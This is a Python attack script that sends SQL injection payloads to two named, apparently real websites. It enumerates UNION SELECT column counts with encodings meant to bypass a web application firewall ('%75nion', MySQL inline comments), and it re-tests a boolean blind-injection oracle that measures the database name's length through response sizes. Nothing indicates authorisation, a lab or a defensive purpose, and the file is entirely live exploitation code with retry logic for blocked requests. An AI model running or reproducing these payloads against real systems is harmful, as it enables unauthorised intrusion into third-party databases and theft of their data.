#!/usr/bin/env python3
"""zagroup: union column enumeration with WAF bypass encodings + comment variants
Also re-test yijingweb oracle stability
"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def fetch(url, timeout=12):
    for attempt in range(3):
        try:
            req = urllib.request.Request(url, headers=UA)
            r = urllib.request.urlopen(req, timeout=timeout)
            return r.status, r.read().decode("utf-8", "ignore")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                time.sleep(2)
                continue
            return e.code, e.read(8000).decode("utf-8", "ignore")
        except Exception:
            return 0, ""
    return 403, ""

print("########## zagroup union enumeration ##########")
BASE = "http://zagroup.net/news.php"
# WAF blocks literal "union"/"UNION" but %75nion passed 200 - test if statement executes
# comments: -- blocked, # blocked. Try /* */ and no-comment variants
tests = [
    # (%75nion = 'union' hex-encoded first char)
    ("%27%20%75nion%20select%201%20%2f%2a%2a%2f--%20", "u-all-1"),
    ("%27%20%75nion%20select%201,2--%20", "u-2cols"),
    ("%27%20%75nion%20select%201,2,3--%20", "u-3cols"),
    ("%27%20%75nion%20select%201,2,3,4--%20", "u-4cols"),
    ("%27%20%75nion%20select%201,2,3,4,5--%20", "u-5cols"),
    ("%27%20%75nion%20select%201,2,3,4,5,6--%20", "u-6cols"),
    ("%27%20%75nion%20select%201,2,3,4,5,6,7--%20", "u-7cols"),
    ("%27%20%75nion%20select%201,2,3,4,5,6,7,8--%20", "u-8cols"),
    ("%27%20%75nion%20all%20select%201,2,3--%20", "u-all-3"),
    ("%27%20%75nion%20all%20select%201,2,3,4,5,6--%20", "u-all-6"),
    # inline comment split (/*!50000union*/)
    ("%27%20/*!50000union*/%20select%201,2,3--%20", "inline-union"),
]
for p, tag in tests:
    code, body = fetch(BASE + "?c=259" + p)
    m = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    marker = ""
    if code == 200 and len(body) not in (4374, 4312):
        marker = " <== DIFF SIZE"
    print("%-15s code=%s size=%d%s %s" % (tag, code, len(body), marker, m.group(1)[:80] if m else ""))

print("\n########## yijingweb oracle re-test ##########")
BASE2 = "http://yijingweb.com/webmall/detail.php"
for p, tag in [
    ("%27", "quote"),
    ("%27%20OR%20(select%20length(database()))=2--%20", "len2"),
    ("%27%20OR%20(select%20length(database()))=7--%20", "len7"),
    ("%27%20OR%20(select%201)=1--%20", "true"),
]:
    sizes = []
    for _ in range(3):
        code, body = fetch(BASE2 + "?id=686" + p)
        sizes.append(len(body))
        time.sleep(0.3)
    print("%-8s sizes=%s avg=%d" % (tag, sizes, sum(sizes)//3))
